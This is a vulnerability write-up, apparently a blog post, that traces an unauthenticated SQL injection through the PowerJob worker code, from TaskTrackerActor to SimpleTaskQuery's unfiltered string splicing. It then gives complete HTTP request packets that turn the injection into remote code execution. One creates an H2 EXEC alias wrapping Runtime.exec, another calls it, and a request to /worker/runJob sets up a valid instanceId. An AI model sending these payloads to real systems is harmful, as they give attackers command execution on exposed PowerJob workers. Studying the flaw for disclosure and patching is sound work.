## code analysis

In `tech.powerjob.worker.actors.TaskTrackerActor#onReceiveProcessorReportTaskStatusReq`, the value will be taken from the ProcessorReportTaskStatusReq entity class, and the value can be changed from the request package. The entity class is as follows, where taskId is of String type, and when entering the processing class When there is no authentication and verification value

After entering, the value of getInstanceId will be obtained first, and then judged. This value is the value assigned when the job is running, that is, the value needs to be the instanceId value of the running job. You can construct the value through /worker/runJob

![image.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/30214593-2a73-3ab7-4761-ed33149ddd4e.png)

![截图_20230515142648.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/08da7a76-aa8d-332b-83a7-e5cd811c6197.png)

```java
public static final String WTT_PATH = "taskTracker";
public static final String WTT_HANDLER_REPORT_TASK_STATUS = "reportTaskStatus";
```

After entering `tech.powerjob.worker.core.tracker.task.heavy.HeavyTaskTracker#updateTaskStatus`, the cache will be detected first, and the database query will be performed if the cache does not exist

![截图_20230515142811.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/b4bc397b-b68a-bbf5-5043-9b32332b7293.png)

Then enter `tech.powerjob.worker.persistence.TaskPersistenceService#getTask`, generate a SimpleTaskQuery instance, just encapsulate the value in `genKeyQuery()`

![截图_20230515142848.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/df25846d-69dc-6646-6ef4-babdce6d8ab2.png)

![截图_20230515142857.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/c4c3a856-d7b2-fb44-386a-a1ec72102e10.png)

Finally, enter `tech.powerjob.worker.persistence.TaskDAOImpl#simpleQuery` to splice sql statements and execute sql operations

![截图_20230515142921.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/885f11f8-9ce5-22f2-4c32-253ed1bbb3e2.png)

In `tech.powerjob.worker.persistence.SimpleTaskQuery#getQueryCondition`, judge whether the value exists and then splice the sql statement through append without any filtering

![截图_20230515142949.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/c07880fb-10ff-038b-1a53-16ddbaa38815.png)

## actual use

You can execute sql statements, but we know that the database is an H2 database, so let's try to see if we can rce
H2 database can use stacking by default, and can build java functions so rce

Send a request packet and create an EXEC function

```http
POST /taskTracker/reportTaskStatus HTTP/1.1
content-type: application/json
Content-Length: 318
host: 192.168.1.177:27777

{"instanceId":537868,"subInstanceId":2,"taskId":"test';CREATE ALIAS EXEC AS CONCAT('void e(String cmd) throws java.io.IOException',HEXTORAW('007b'),'java.lang.Runtime rt= java.lang.Runtime.getRuntime();rt.exec(cmd);',HEXTORAW('007d')); --","status":3,"result":"4","reportTime":5,"cmd":6,"appendedWfContext":{"a":"1"}}
```

Send the package again to call the EXEC function and pass the parameters

```http
POST /taskTracker/reportTaskStatus HTTP/1.1
content-type: application/json
Content-Length: 392
host: 192.168.1.177:27777

{"instanceId":537868,"subInstanceId":2,"taskId":"test';CALL EXEC('calc'); --","status":3,"result":"4","reportTime":5,"cmd":6,"appendedWfContext":{"a":"1"}}
```

![截图_20230515143408.png](https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/3eacaba8-84ce-6dbd-ccd8-306c75b552ef.png)

### get instanceId

Start a job via /worker/runJob

instanceId can be changed at will, and the classes specified in processorInfo are included in the source code

```http
POST /worker/runJob HTTP/1.1
content-type: application/json
Content-Length: 530
host: 192.168.1.177:27777

{"allWorkerAddress":["192.168.1.177:27777"],"maxWorkerCount":0,"jobId":46,"wfInstanceId":null,"instanceId":537868,"executeType":"BROADCAST","processorType":"EXTERNAL","processorInfo":"tech.powerjob.samples.tester.JobRepetitiveExecutionTester","instanceTimeoutMS":0,"jobParams":"","instanceParams":"test","threadConcurrency":5,"taskRetryNum":1,"timeExpressionType":"API","timeExpression":null,"maxInstanceNum":0,"alarmConfig":"{\"alertThreshold\":0,\"silenceWindowLen\":0,\"statisticWindowLen\":0}","logConfig":"{\"type\":1}"}
```
